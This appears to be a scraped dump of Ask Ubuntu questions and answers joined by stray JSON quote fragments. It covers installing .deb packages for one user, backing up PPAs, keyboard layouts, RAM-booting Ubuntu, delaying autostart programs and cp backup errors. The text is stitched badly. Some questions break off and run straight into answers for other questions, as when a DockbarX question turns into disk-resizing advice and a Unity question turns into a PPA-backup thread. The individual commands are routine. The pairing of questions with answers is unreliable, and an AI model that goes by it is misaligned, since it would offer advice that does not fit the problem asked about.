qemu-user-space\n\n*Linux namespaces - Allows to have full root inside a local environment, when using user namespaces, a feature that is available in Linux kernel versions 3.8 and after.\n\n\nSummary: By emulating, or actually having, root privileges locally, DEB packages can be installed for a local environment.\n\nA: Depending on what you want to accomplish, there may be different ways to make this work (or at least give a hacky semblance of the functionality you want).  \nInstallation of software in many ways comes down to making resources available, or allowing access to things that are already present on the system. \nWhether you are talking about granting access to printers, or allowing a user to execute programs in a certain directory, there are ways to accomplish this, and though they may be native to Ubuntu, these kinds of solutions are generally (of course) going to be added after the fact of a .deb installation. \nHere are two general classes of post-installation control that can be added.   Note that, given the right environment, e.g. when a tightly controlled group policy is in place, this might be easier once you have the basic system in place.   These kind of permission can even be tied to LDAP or a similar system which can give per-user or group authentication and authorization.\nVisiblity control\nI've had a perhaps somewhat similar situation myself, but in my case, the users were not (yet) very sophisticated (all of them being under 7 years old).  For me, just hiding Gnome menus and or removing desktop launchers worked.  \nRemoving the executable bit from directories eliminates the ability of processes to search or traverse them.   It can effectively render them invisible, and user-wise, make them unavailable.   If you have a default system policy which creates menus based on file access, for instance, you can get this kind of cosmetic solution in place, and then have it work for subsequent installations with little additional effort. \nExecution control\nControl of the resource can be done via Unix permissions, apparmor profiles, SELinux permissions, and so on.   There may be other levels of control filtering which may come into play depending on the application.   In the absence of more targeted solutions, you might have to write wrappers around certain programs to control user or process access. \n\nA: You can probably use the --root option of dpkg to install to another directory. But will probably run into problems if the application looks for stuff in fixed places like /etc.\nIn short, I don't think there is an easy way.\n\nA: You could change the executable file's ownership so that only one user would be able to run it. Then, if needed, you can remove the application from the menus of other users. \n\nA: Well dpkg won't help you as this isn't its design aim. It wants to be a root-owned sole census of packages installed on a system.\nThe only thing that jumps to mind is just extracting the package and trying to place the files manually in the home dir.\nHowever this will only work for some things. Plenty of packages are split into chunks (executables or scripts in /usr/bin, libraries in /lib and other garb in /usr/share, etc) and these locations are hard-coded in by the build scripts. Thus if you try and pull in something like this into ~, it will break. You could spend hours unwinding the dependencies but you could be doing something useful with your time like finding the cure for cancer or absorbing some of the beauty in the world.\nYou'd do much better just to grab a non-packaged version from whoever writes the software. Almost all free software is available in some form of compressed archive as source so grab that and just build it. You don't do the make install step. Your app is built, just put it where you want it.\n\nA: Doubtful.\nThe deb's are mainly archives that get extracted to the root of your filesystem when installed (plus some config). If you wanted to install them just for one user, you would need to somehow install them to /home/user folder. Even if you did so, they wouldn't work, as f.e. application binaries won't land in /usr/bin (or sth similar), and system will not find them if you'll try to launch them. Similarly libraries etc. would be useless, as the system wouldn't know there are somewhere in the /home. You could try the brute-force approach, and adjust the PATH variable to point to wherever you extracted the files from the deb archive, but that would be not only VERY insecure, but might cause may compatibility problems (f.e. menu entries wouldn't work, as GNOME extects the .desktop files to be in /usr/share/applications).\nMoreover, if you installed a package just for some users, it might cause crazy dependency problems, if any other user installed package that conflicts with another one you have had installed just for yourself - and possibly tons of other package management related issues would appear.\nAll these troubles make it extremely difficult to manage packages separately for users, so it seems it's not possible to install them just for one user, because the idea behind the .debs disallows that.\n", "Q: DockbarX Applet not loading I used to have dockbarX applet installed on my gnome panel.

There's a bug in zeitgeist and DockbarX 0.43 don't handle that error as it should. Next version will simply not use zeitgeist if there's an error instead of crashing.\nIt might take a while before the next release of DockbarX (I'm doing some code cleanup that is much more work than I suspected).

Pending the output of sudo fdisk -l /dev/sda I wonder if the partition /dev/sda3 as defined by the disk partition table (which fdisk will tell us) is 70.50 GiB, while the filesystem on the partition is only 25 GB.\nIf that is correct, then it would appear that GParted has a bug in that it assumes the filesystem is the same size as the disk partition, asks the filesystem how much space is free, and then assumes the rest of the disk partition is used.\nAlso, if that is correct, then you should be able to resize the filesystem to fill the partition. Backup any valuable data and then boot off a live CD (or live USB stick) and without mounting the partition, run\nsudo resize2fs  -p  /dev/sda3\n\nThen leave well alone until it is done and reboot.\n\nA: This happened to me recently because I incorrectly used dd to copy data from one drive to another. It kept the data safe but all the drive metadata was screwed.\nIn the answer (that I've edited to show what I did), I found that temporarily rsyncing the data off to another drive, reformatting the disk and recreating the partitions (by running the installer, of all things) and then rsyncing the data back, fixed it.\nWhatever you do, if there's any irreplaceable data involved, get a backup.\n", "Q: How can I remove black bars at smaller resolutions? I have an HP Pavilion dv1000 laptop with a widescreen monitor.\nMy monitor works well at its native resolution, But when I choose 1024x768, I see black bars on left and right side of the monitor. \nI used a live-cd of an old Backtrack 3 distro, and I notice it can stretch the image there, but in Ubuntu I can't. Can someone help me?\n\nA: You can use xrandr --ouput [name_output] --set \"scaling mode\" Full.\nThis way the image will scale to the full size of the screen, of course you have to do this every time you want to solve the problem or modify permanently your options.\n\nA: This doesn't really answer the question, but please take into account that LCD displays are meant to be used in the native resolution. If you don't want to do that, at least choose resolutions with the same aspect ratio (for WXGA this is 5:3). In theory it might be possible to stretch 1024x768 into 1280x768, covering the black bars, but the resulting quality would be horrible.\n", "Q: How to add UTF-8 support to my hard disk in fstab? I use Ubuntu (Spanish language).

Can someone tell me how that line should look like?\n\nA: With ext4 (or ext3/2) you don't have to specify character set for filesystem. It does not care, as long as you are not using unescaped control characters in filenames.\nYour system locale is more important thing. Try dpkg-reconfigure locales and select appropriate UTF-8 locale. Also, if you are using virtual terminal, make sure you have UTF-8 enabled (for example in GNOME Terminal: Terminal->Set Character Encoding).\n", "Q: How do I try Unity from Natty?

But my concern is that over the past year, most of my more interesting (or used) applications are from PPAs, and just backing up my sources list won't add the associated launchpad keys the way that add-apt-repository does.\nSo I'm looking for a way to list all the PPA urls (like ppa:chromium-daily/stable) so that I can easily script a series of add-apt-repository commands to add them into a new installation gracefully.\nShort of dumping my bash history of course.  Which might be feasible, depending on how far back that file goes back?\n\nA: What I do is that I copy the whole /etc/apt directory to a safe place.  If you have to reinstall or clone your install, just copy back that directory.  It'll save even the gpg trusted keys.\n\nA: If importing all the GPG keys is what you're looking for, you can use my script (comes in a .deb) to import all missing GPG keys at once. Download\nTo use, simply run:\nsudo launchpad-getkeys\n\nYou can take a look inside the .deb if you want, the script is really small and easy to understand (in case you don't trust my deb).\nThen to back up all the PPAs, all you have to do is copy all the .list files on the new computer / new installation and once you've copied them, run the above command to import all the keys.\n\nA: Well because I like mucking around with command line scripting, I've written the following. It generates a list of PPA strings that you could backup and then script into add-apt-repository:\ngrep -RoPish '(?<=ppa.launchpad.net/)[^/]+/[^/ ]+' /etc/apt | sort -u | sed 's/^/ppa:/'\n\nThat'll generate something like:\nppa:ubuntu-wine/ppa\nppa:am-monkeyd/nautilus-elementary-ppa\nppa:nilarimogard/webupd8\nppa:ubuntu-x-swat/x-updates\nppa:tualatrix/ppa\nppa:banshee-team/banshee-unstable\nppa:chromium-daily/beta\nppa:libreoffice/ppa\nppa:banshee-team/ppa\n\n\nIf you ever wanted to blanket-restore those, you could pipe them back into the system like so (assuming we saved the PPAs to ~/ppa-backup.txt:\n<~/ppa-backup.txt xargs -I % sudo add-apt-repository %\n\nI would probably suggest you don't just restore them all. Look through the backup and make sure you know what each PPA contains. \n\nA: To backup all list of third-party deb-repositories along with Flatpaks and Snaps one can try my python script named srslsud (Save/Restore Software List Script for Ubuntu and Debian).\nIt will save all APT repositories, their GPG keys; lists of Snaps, Flatpaks and Ubuntu Make apps to JSON files from the first machine.\nThen you can restore this list using same JSON files on the second machine.\n# minimal for APT\nsudo apt-get install python3 python3-gi python3-apt software-properties-common python3-jsonpickle\n\n# additional for Snap, Flatpak\nsudo apt-get install snapd flatpak gir1.2-snapd-1 gir1.2-flatpak-1.0\n\n# additional for Ubuntu Make\nsudo apt-get install ubuntu-make\n\ncd ~/Downloads\nwget https://raw.githubusercontent.com/N0rbert/srslsud/master/srslsud.py\nchmod +x srslsud.py\n./srslsud.py all_save\n\nThen copy *.json files along with srslsud.py to the target system and run   the following commands there:\n./srslsud.py all_load\nsudo bash ./apt.sh\n\nAnd finally enjoy new cloned system.\nNote: if you need only APT - use apt_save and apt_load instead.\n\nA: From my answer on How can I get a list of all repositories and PPAs from the command line into an install script?\nList PPAs in ppa:USER/REPO format:\nlist_ppas () {\n  grep -E '^deb\\s' /etc/apt/sources.list /etc/apt/sources.list.d/*.list |\\\n    cut -f2- -d: |\\\n    cut -f2 -d' ' |\\\n    sed -re 's#http://ppa\\.launchpad\\.net/([^/]+)/([^/]+)(.*?)$#ppa:\\1/\\2#g' |\\\n    grep '^ppa:'\n}\n\nGenerate install script:\nlist_ppas | xargs printf 'add-apt-repository -y %s\\n' > install_ppas.sh\n\n(take out the -y if you don't want non-interactive install)\nRun the script:\nsudo sh install_ppas.sh\n\nSee my answer on the other question for full scripts with a few extra features that you can save and use.\n", "Q: By default, the left ALT key drags and moves windows.

On 10.04 (and other versions, but I am asking about 10.04), going to\nSystem ➜ Preferences ➜ Appearance and selecting the Visual Effects tab shows possible values of None, Normal, and Extra. How can I query from the command line what the current setting is?\n\nA: Yes, you can. If you are using GNOME, then there is excellent gconftool command.\nTry\ngconftool --get /desktop/gnome/session/required_components/windowmanager\n\nIt'll return metacity when setting is \"None\" and compiz for \"Normal\". At least in my Ubuntu 10.10 only difference between \"Normal\" and \"Extra\" was \"wobbly\" in plugins list.\nTry\ngconftool --get /apps/compiz/general/allscreens/options/active_plugins\n\nto get list of plugins.

In other programs like Firefox and LibreOffice, it does not.\nI am not an application programmer, but I imagined it has to do with their cross-platform nature and the way they are compiled or the toolkits they use.  Then I noticed that Gnome-Do behaves the same way, the cursor stays on screen while typing.\nWhy is there inconsistent handling of the mouse cursor, while typing, across different applications?\nThank you.\n\nA: I'd say it is just how a designer decided to write the application there are no set rules for whether a cursor should hide or not.\n", "Q: Swap utilization: system level versus individual processes On my top output, at header level, swap is showing 0k used. But on each individual process the SWAP is shown as a non-zero value (output column enabled with option p).

Until you have enough going on to actually use Swap, I guess those numbers wont match up with amount of swap used.  RES is how much memory cannot be swapped out and VIRT is the total amount of virtual memory needed by the program (VIRT=RES+SWAP)\n", "Q: Why is the console hanging randomly? Ubuntu 10.10 Server x64 installed as Virtual Box VM.\nFresh install plus postgresql and tomcat6 installed via aptitude. Rebooted the server and now when I run some command the console hangs.

I can't figure out how I allow my iBook to right click in Ubuntu. It's one big button; so, I used to hold Option and click. I'm willing to do that, but I can't figure out how. Unless, of course, I've completely let the noob out and one doesn't right click in Ubuntu. \nThanks for the help!\n\nA: I found it. \nYou need to edit the scrip that they talk about her to mimic right clicking, not middle clicking. Here are the steps. \n\n\n*\n\n*Install mouseemu:\nsudo apt-get install mouseemu\n\n\n*edit the /etc/default/mouseemu file:\nsudo nano /etc/default/mouseemu\n\n\n*Then add this to the file:\nRIGHT_CLICK=\"-right 125 272\"      # Left Apple Key (LEFTMETA) + click\n\n\n*Do everything else the same as the forum post. \nI hope this helps folks. \nReference: Ubuntu Forums: i can't right click\n\nA: There are instructions in Ubuntu Wiki (see topic \"Trackpad\").\nBasically, you can map right click to two finger click by modifying system preferences and /usr/lib/X11/xorg.conf.d/10-synaptics.conf:\nSection \"InputClass\"\n    Identifier \"touchpad catchall\"\n    MatchIsTouchpad \"on\"\n    MatchDevicePath \"/dev/input/event*\"\n    Driver \"synaptics\"\n\n    Option \"FingerLow\" \"10\"\n    Option \"FingerHigh\" \"20\"\nEndSection\n\n\nTo achieve familiar behavior with the Apple trackpad go to System -> Preferences -> Mouse and select the Touchpad tab. Select Disable touchpad while typing. Deselect Enable mouse clicks with touchpad. Select Two-finger scrolling.\n\n(quote from wiki)\n\nA: By default (with Lubuntu 12.04 on the iBook G4 I am currently using), middle-click is mapped on F11, and right-click on F12. \nI can also do a right-click by making a \"two-finger tap\" on the touchpad.\n", "Q: How do I get keyboard to write Hiragana instead of Katakana? I added the Japanese Layout in Keyboard preferences, however all the layouts look like being in katakana. \nI suspect that the key that is to the left of the number 1 (above Tab and under Esc) could be the one to switch from Katakana to Hiragana.\nHowever, I don't have that key in my keyboard and my other Toshiba laptop does not have it either. I really don't know what to do, I simply want to be able to write in Hiragana in Ubuntu.\nHow can I solve this problem?\n\nA: I finally found out how to do this on Ubuntu 16.04!\n\n\n*\n\n*Go to System Settings > Language Support\n\n*Click on Install / Remove Languages\n\n*Scroll down or type J and check the checkbox next to Japanese in the Installed column. After this, click on Apply Changes\n\n*Enter your password when you're prompted\n\n*Let the packages install\n\n*Log out (yes, this is necessary)\n\n*Open System Settings and go to Text Entry\n\n*Click on the small plus sign at the bottom of Input sources to use\n\n*Select the entry Japanese (Mozc) (IBus) from the list and click on Add\n\n*Japanese (Mozc) (IBus) should now show up inside the Text Entry window and Mozc should be available in the menubar's menu. You probably want to change the setting Use the same source for all windows to Allow different sources for each window and switch to New windows use the default source. Additionally, you eventually want to reassign the key to switch to the next input source. I normally use the Pause to toggle between languages.\n\n*Now fire up some text editor and try it by clicking on \"Mozc\" in the text entry menu, set the input mode to hiragana and type some Japanese. Switching between candidates is done by pressing the space bar and Katakana conversion is done by pressing F7.\n\n\nNote: If you face any issues with different applications, it might help to restart the IBus daemon using ibus restart.\nSee also the original article archive.is by Moritz Molch. There are also screenshots there, which should make everything a little clearer.\n\nA: I'm not sure that the \"Japan Kana\" layout can do hirigana. The key left of 1 doesn't toggle for me.\nI've only ever used an IME to type Japanese, that might be an easier option for you - you type phonetically in romaji and it's converted to kana and kanji. A guide to installing it is here:\nhttp://www.localizingjapan.com/blog/2010/06/15/setting-up-japanese-input-on-ubuntu-linux-10-04-lts-lucid-lynx/\nTo write, you type in romaji, e.g. nihongo. As you type, that would be replaced by hirigana にほんご. Hit space and that would be replaced with the kanji 日本語. Hit space again and you get a menu of other ways to represent it, which is important as Japanese has many homonyms.　　\n\nA: I don't know Japanese and don't have a Japanese keyboard, but I think I might have found what you're looking for.\nThe key is IBus. Fire up IBus Preferences and install the Japanese \"anthy (m17n)\" input method. Then, configure IBus to show the language bar when you activate Japanese mode. If you don't have the proper key on your keyboard to toggle the input method on and off, you can configure your own. I use the Pause key for this. Annoyingly, you can't add a key directly from the preferences window, but you can do so easily enough from within gconf-editor.\nWhen you type, you should be able to get hiragana directly. If not, play with the language bar settings and you'll surely find what you're looking for.\n\nA: Following up... on my system, in Kana mode keypresses generate hirgana and Shift-keypresses generate katakana. Logical if you think of katakana as upper case and hiragana as lower case.\n", "Q: Distro that I can load into RAM? Is there a modified version of Ubuntu that I can choose to load to RAM on start up? Kinda like the LiveCD, but that can be easily modified (ie: I can install stuff) when I choose to boot from disk.\nThe idea is to install it to a USB drive. I know there's something similar but slax is lacking in many departments. A \"full\" version Ubuntu would be better.\nA LiveUSB installation seems to be pretty close to what I want, but apparently I have to choose whether or not it will be persistent by the time I install it. I want to be able to choose that every time I boot.\n\nA: This answer includes text which I used to answer a different question but it is placed here in order to illustrate and give a visual guide, which you probably already have.\nIn the majority of the cases, Ubuntu (almost any version) will run perfectly in a live session, and placed in a USB with \"Persistent\" data options, you will have what you wish.\nThe problem will be that, when you unplug the USB memory/hdd, the disk will be unmounted, and that way -even when you re-plug, the USB will be unreachable, unless you do something in order to recover the mount point to the USB.\nNevertheless, all the running applications will continue running even if you unplug or unmount the USB. \nA good idea to try is to make sure that all the processes you need are loaded at startup, which will ensure that the processes will be running at the time you unplug the USB.\nMe myself have done that with just a few applications. I am using Israel Remix Team distro which is already pre-loaded with lots of applications in advance, and this way, when the application is loaded, I can unplug the USB memory and the program continues the run.\nI haven't tried hard resources demanding programs, but in my case: \n\n\n*\n\n*File sharing continues working and\nsharing files, even when those files are in a fixed hard disk drive, other than the USB file system.\n\n*VLC continues playing a radio\nstation broadcast without problems,\n\n*Yakuake continues the work and does\nwhat I request unless I wish\nsomething of the unplugged USB\n\n*Google Chrome continues surfing the\nweb and allow me to do several\nthings like monitoring ip-cameras.\n\n\nThe only problem is when I try to plug the USB in order to run a new application, which won't be achieved by the currently running OS instance, so I have to reboot in order to start a new application beside those which are loaded at startup.\nAnother good Idea would be to use the feature to \"Remember Currently Running Applications\" in the \"System/Preferences/Startup Applications\" preferences window. Which (when enabled) will \"remember\" all the programs that you are using and will re-open them after a reboot or when starting the system for the first time in a day.\nIf you wish to remove an application from this feature simply close it and go to this function and press the \"Remember Currently Running Application\" in order to refresh the list of the programs that will be opened the next time.\nA screenshot is placed here in order to illustrate.\n\nThen, taking in consideration what I say above, it is worth to perform the next experiment:\nUSB Startup Disk guide:\nFirst of all, you can make a USB Startup Disk using a GUI, which will ease the task. Unfortunately, this can only be done when inside of an ubuntu system, both Live session or Installed system can do the trick.\nI know that people may suggest you to follow a few other successful procedures, but in my case I will talk about the \"Startup Disk Creator\".\nIn several Linux Distributions you can find this tool in the \"System/Administration/Startup Disk Creator\". I strongly suggest you to try the Israel Remix Team, the one I use, but almost any distribution should feature this tool.\nA screenshot is placed here for you to see the tool when recently opened:\n\nMake sure that you have downloaded your prefered Ubuntu distribution prior to try this in a live session.\nIn the \"Make Startup Disk\" window, click in the \"Other\" button in the top right side in order to choose your Linux distribution's iso that you previously downloaded and have already inserted the USB that you are going to use for the process. Both the \".iso\" and the USB should appear in their respective areas. \n\nNOTE: If you are going to use a pre-burned DVD for the process, simply insert the DVD in the tray and it will be listed into the sources list as shown in the next image:\n\nIn my case, my 4 GB USB memory is having a live session already installed, what I am going to do first is to clic in the \"Erase Disk\" in order to gather enough space for the system, after which I will get the options for the data handling, on which I am going to choose the amount of disk size that I wish to use for saving data and configurations (like installing programs, etc.) I am going to use 1.4 GB for that purpose.\n\nNow I click the \"Make Startup Disk\", and the copy process is going to happen.\n\nAfter which the GRUB should also be installed. Unfortunately the GRUB install process was too fast so I couldn't take the shot.\nThe persistence file will be created.\n\n\nThen you will be able to start from that USB. Note that you can use both USB memories or USB hard disk drives, even when in use with an adaptor, IDE-to-USB or SATA-to-USB.\n\nThis should work as you wish, at least it makes me feel happy with the results.\nGood luck!\n\nA: I have been working on JUST this. A livecd-to-usb setup wasn't working very well for me. I have created a modified version of the \"local\" script for ubuntu server 11.04. After applying the patch (or hand editing local with the changes of course) you only need update-iniramfs -u, and boot linux with a \"ramboot\" kernel argument, and your system will boot a normal linux system fully into ram. Making persistent changes is as easy as rsync'ing the ramdisk filesystem onto the boot-device. In my case, a usb-pen, but it could easily be any suitable bootable block device. You can, of course, just reboot without the \"ramboot\" argument and make changes, as you will be back on the block device, then reboot into ramboot again, but there is no need, except it makes it very clear when you're in which state. \n0) \"sudo su\" \n(you don't have to do this step, but then you will need to make sure you sudo everything that might require it) I tend to just \"sudo su\" when I'm doing this type of systems modifications. \n1) download or copy/paste the contents of this patch to a file:  \n\"/usr/share/initramfs-tools/scripts/ramboot.patch\" --couldn't include pastebin, newbie. \nincluded at end\n2) cd /usr/share/initramfs-tools/scripts; cp local local.bak   #just in case\n3) patch local ramboot.patch\nThis applies the changes defined in ramboot.patch, to your local script. /usr/share/initramfs-tools/scripts/local is the normal bootup script configurator which configures the rootmount function for init. The patch was created by \"diff local local.modified > ramboot.patch\"\n4) cp /bin/busybox /usr/lib/initramfs-tools/bin/busybox\nThis makes your initramfs.img file slightly larger then it would be normally, but the difference is about 1.5 megabytes, not major. I wanted the human readable output from df -h, which the stripped down busybox's df doesn't support. If you care about keeping the 300k version of busybox around, make sure to cp /usr/lib/initramfs-tools/bin/busybox /small_busybox, then return it to it's former name/location after step 5.\n5) update-initramfs -u\n6) optional you will most likely want to create a /etc/grub.d/06_custom, with the kernel argument \"ramboot\" included, and a title that implies that. \n(or 40_custom if you want the ramboot menu entry to be at the end of the list, instead of at the top)\ne.g. 06_custom -- couldn't include pastebin link, newbie here. \nyou will need to fill in your correct kernel-version and initrd.img-verion and also the filesystem uuid of your root device into this 06_custom file or else it will not work. \nyou can find the kernel/initrd.img information by just looking in /boot/ with \"ls /boot\" and the following command should output your root filesystem uuid:\nblkid|grep `df /|grep dev|cut -d ' ' -f1`|cut -d '\"' -f2\nOnce your 06_custom has the correct uuid, kernel and initrm.img paths and file names, you can update-grub, and try it out!\n7) update-grub to add the custom entries to your /boot/grub/grub.cfg file. \nNote: I have a small system with the root partition only including about 1.2g of data to copy into ram. If your system doesn't have enough spare memory, this script will safely boot normally (or at least try!) I found remastersys, and persistent usb-casper installs to not exactly be suitable for my needs. \nThis is used on a scst-iscsi server currently, and it's only real weakness is that if you don't save changes to the system, and lose power, or some other mistake (init 0, oh no, I forgot to check in my work back to subversion! disaster!) then the ramdisk system doesn't make anything persistent. I don't have a ton of air-time on this config yet, but since I had looked around for this type of information, found lots of ways that were not exactly suitable, or just plain confusing to me, I thought I'd put this out there. perhaps it will save someone a little teeth pulling *8^) \nremastersys and the root-ro scripts helped me to this point. they are both useful but different projects. remastersys packages your running system, to both deploy/clone, or just run as a live.iso version of the system, or backup I guess. root-ro is a dual-ramdisk blockdevice-filesystem mounted union-style, with the ramdisk writeable, and the blockdev read-only. then to sync you can just remount the blockdev rw, rsync once branch to the other, and remount it ro. This was almost perfect, but I wanted the usb-pen to be unmounted/able to be removed and the system would maintain it's state, which this solution does. \nroot-ro bottom of the page -- https://help.ubuntu.com/community/aufsRootFileSystemOnUsbFlash\nremastersys -- http://www.geekconnection.org/remastersys/ubuntu.html\nYou can easily rsync or copy -r from the ramboot (mounted on /) and the disk/device which it came from originally when running in ram, to make that change \"persistent\". \nI save the uuid of the device that the ramboot booted from, so you can always find it afterwards. It is in /.bootdisk_byuuid on the ramdisk, and you could easily set a script to mount this device somewhere, do the rsync, and umount it again, and call that script \"ramtodisk\" or whatever. \nNB! you may want to back up your /boot/initrd.img  file so in case something goes wrong, your system is still bootable.

How to delay a program such as cairo-dock (No openGL) or Firefox?\nSometimes programs crash when started with other startup apps. I want programs to start 10 seconds late to avoid a crash.\n\nA: You could try to change the command to this:\nsleep 10 && firefox\n\nSome people say it works, some say it doesn't, if this is your case, and it does not work, you can try with:\nxterm -e 'sleep 10 && firefox'\n\n\nA: Delaying autostart with inbuilt delay option\n\nNote: Only works with desktop sessions that recognize the X-GNOME-Autostart-Delayparameter (e.g. Unity, Unity2D, GNOME). This will not work for LXDE, XFCE, KDE, etc.\n\nWith this solution there's no need for a script or sleep. Head to your autostart folder:\nnautilus ~/.config/autostart\n\nFind the .desktop file that corresponds with your application and open it in a text editor, e.g. gedit:\ngedit ~/.config/autostart/application.desktop\n\nAppend the following line to the file:\nX-GNOME-Autostart-Delay=foo\n\nwhere foo is the time in seconds you want to delay the application launch by, e.g.:\nX-GNOME-Autostart-Delay=60\n\nSave the file, relog and you should see the effects.\n\nA: I had to use this to get it to work for skype: sh -c \"sleep 10 && skype &\" in Ubuntu 12.04\n\nA: Try this: \nbash -c \"sleep 10 && firefox\"\n\n\nA: Make a startup command using https://askubuntu.com/a/48327/139749 .

In the 'Decoration windows' field enter:\n!(class=Gnome-terminal)\n\nTo further customize this you can hide a specific set of terminals by entering in the 'Decoration windows' field:\n!(title=tmux_terminal)\n\nThen, borders will only be disabled for terminals that are started as follows:\ngnome-terminal --title=tmux_terminal\n\n", "Q: How can I have only two specific keyboard layouts in my system without 'us'? I want only two keyboard layouts in my system: us altgr-intl (USA International (AltGr dead keys) ) and gr (Greece), so this is what I've selected in System → Preferences → Keyboard → Layouts. However, every time I begin a new Gnome session (reboot, logout/login), the us keyboard layout is automatically inserted at the top of the list.\nI created a small script called fixlang that ensures the desirable result:\nlayouts='[us    altgr-intl,gr]' # tab between us and altgr\nkey=/desktop/gnome/peripherals/keyboard/kbd/layouts\n\nactive_layouts=\"$(gconftool -g $key)\"\nif [ \"$active_layouts\" != \"$layouts\" -o \"$1\" == -f ]\nthen\n    gconftool -t l --list-type=str -s $key \"$layouts\"\nfi\n\nwhich I run on login.\nHowever, this is a kludge. How can I ensure that Gnome does not mess with my keyboard layout selection?\n\nA: You are probably experiencing bug #688936. It hasn't been fixed yet, but you could try the workaround in comment #5:  \n\nI've finally found a solution for this:\n  \n  \n*\n  \n*Log out.  \n  \n*Click on your account, but don't enter the password yet.  \n  \n*A small bar with several drop-down lists appears on the very bottom of the login screen. You probably never noticed it before - I for sure didn't ;)  \n  \n*Select the correct keyboard layout in the second-from-left drop-down list.  \n  \n*Login.  \n  \n  \n  Fixed :)\n\n\nA: Are you sure you're not running some script which is modifying the list of layouts on boot/login already? I've used only the \"USA Dvorak International\" and \"Norway\" layouts since 8.04, and I've never seen this. Or if you modified the GNOME settings files by hand (which looks likely, considering fixlang), this is probably detected and overridden on GNOME shutdown/startup.\n", "Q: Avoid random disk names I have Ubuntu Server 10.04 1 system disk, and 5 disks in RAID-5 configuration.\nThe problem is that names of these disks are changed from time to time, they are being randomly mixed from time to time (sda,b,c,d,e,f - so system disks might be sda, or sdc at different time for example)....\nis there any way to fix drive names, so that even if it's disconnected for example, no other drive can occupy this letter based on disk UUID or something?\n\nA: It's best to always refer to the disks by UUID; you can use the symlinks in /dev/disk/by-uuid/ (or by-id if that's more suitable) to refer to the device nodes.\nThe /dev/sdxN names are never guaranteed to be consistent, so relying on fixed names is not a good idea.\n\nA: IF you do insist on stable names you may be able to use udev rules to fix the names on mount.  In your case you may need to use serial numbers or something equivelent to identify the disks.  \nI don't know if upstart will be taking over disk mounting.  If so, you would need to implement the equivalent rules there.\nAlternatively, you could create symlinks to /dev/disk/by-uuid to use for monitoring.\n", "Q: Split a text file by its entries \nI'm trying to analyze an enormous text file (1.6GB), whose data lines look like this:\n\n20090118025859 -2.400000 78.100000 1023.200000 0.000000\n20090118025900 -2.500000 78.100000 1023.200000 0.000000\n20090118025901 -2.400000 78.100000 1023.200000 0.000000\n\nI don't even know how many lines there are.

I'm not sure how to do it, but I am certain there is some X11 feature that lets you do this, an there probably is no nice GUI for it so I hope you don't mind text config files or scripts :-)\nIt seems someone on stackoverflow already have solves this problem maybe... https://stackoverflow.com/questions/294177/is-it-possible-to-map-a-key-press-to-simulate-middle-click-in-xwindows\n", "Q: External backup - \"cp: cannot create regular file\" error I have always backed up my home directory to an external hard drive using the cp -r command.\nUntil recently, it worked fine, but now I regularly get the error message cp: cannot create regular file followed by invalid argument or cp: cannot create symbolic link followed by operation not permitted.\nI've tried sudo cp -r but the issue persists.  What am I doing wrong?\n\nA: A conflict between the source filenames and the destination filesystem can cause your cannot create regular file error. If you are copying to a USB thumb drive, you are probably using the vfat or fat32 filesystem, which is subject to the usual Windows naming restrictions.\nTo observe this, try creating a file named :, which is a Windows reserved character.\n$ cp /dev/null /path/to/dest/:\ncp: cannot create regular file '/path/to/dest/:': Invalid argument\n\nTo see the Operation not permitted error separately, try creating a symlink without copying.\n$ ln -s somesillysymlink /path/to/dest/symlink\nln: failed to create symbolic link '/path/to/dest/symlink': Operation not permitted\n\nIf you see these errors, that is likely the cause of your problem.\nLikely the simplest approach is to create an archive that is free from the naming restrictions you have encountered, and also preserves symlinks. By default, tar and 7z preserve symlinks. zip preserves symlinks with the appropriate flag. Each of these can store files that have Windows reserved characters in their names. See also “How can I zip/compress a symlink?”\nReplacing the vfat filesystem with something more Linux-friendly – such as ext4 – would alleviate your problem, but at the cost of reduced portability. Almost any Linux system would be able to mount the drive, but other common systems would require extra work. See\n“Creating ext4 partition from console” and the mke2fs manpage for details on the creation end of the process. See\n “How to read ext4 partitions on Windows?”, “How can I mount an ext4 file system on OS X?”, and “How do I mount Ext4 using OS X Fuse” if you need to move that drive to other operating systems.\n\nA: cp -rv should at least tell you what file it's baulking out on.\nThe problem you're having sounds like you're copying a symlink (that is a file that just points to another) to a filesystem that doesn't support symlinks. There are three options for this:\n\n\n*\n\n*Turn your backup volume into a filesystem that accepts symlinks (eg reformat it from FAT or NTFS to EXT3 or EXT4). Might be a pain depending on how much data you've got there (that you might have to juggle while you do it).\n\n*Just ignore symlinks and not copy them. This might break things if you try to restore as it'll be missing some files.\n\n*Expand out symlinks so they contain a copy of the actual data. This takes up more space.\nThe first would be my choice but if you need the drive for another system that doesn't support EXTx volumes, that's an issue.\nWhether or not the second two are realistic options, I'd run cp with its verbose flag to see what you're dealing with. If it's a single file, perhaps a plain copy would be okay, if it's not, and it's just a junky helper, perhaps omitting it would be okay.\nBut as a side note, most people seem to prefer using rsync to do backups. It has a whole lot of options that make it perfect for the job. You can read a version of its manpage here. It has various options (as outlined above) on how to handle symlinks.\n\nA: See your dmesg. Usual problem is either filesystem problem or failing hard disk (and therefore filesystem problem).\nYou can umounting external disk and then running fsck. For example\numount /dev/sdb1\nfsck -f /dev/sdb1\n\n\nA: I just ran into the same problem (actually on Cent OS via VirtualBox) and the problem was permissions related.  I had a shared directory with my local machine (a Mac on OSX Mavericks), attempted a cp and it balked on Protocol error.  In my local machine I changed the owner of the directory to the regular user (me) (from root) and the group to something more generic than wheel.  So, turned out to be a basic permissions problem.\n", "Q: How do you unset an environmental variable using a script? If I have HTTP_PROXY defined in default my environment (by ~/.bash_profile), how can I unset the variable from a script?\nI know that I can do unset HTTP_PROXY from the command line, but if I try to put this command in a script and run it, HTTP_PROXY is still defined. If I load the script using bash or source, it is still defined.\n\nA: When you run a script it will be executed in a separate child process which cannot affect the environment variables in the parent process (i.e. your interactive shell).  However if you use the \"source\" command it will read lines from the script file and execute them in the current shell, so that should work.\n", "Q: Is running temperature considered when a machine is added to the 'Ubuntu certified' list? I have a 2 yr old HP pavillion dv4 laptop. Ubuntu runs fine.\nBut I recently noticed that the temperature of the cores (with just a browser open, not playing flash videos) is significantly higher than when I run windows 7.\nIf I buy one of the laptops listen in the 'ubuntu certified list', is it likely to run ubuntu at the same temperatures as windows 7?\n\nA: It's very difficult to make a direct comparison between one OS and another temperature wise as the programs that collect the data from the temperature sensors in your machine do that in different ways.\nFor instance two different programs in windows can give different results about the same computer at the same time.\nI'm sure that the Canonical testing team would fail a system if it was damaged by running Ubuntu. However they don't know what will happen many month years in to the future.\nEven Hardware manufacturers don't know what will happen even when they know what OS will be running on the hardware for example \n\nA: To answer your question; no.  To address your problem; make sure frequency scaling is working.  Install the 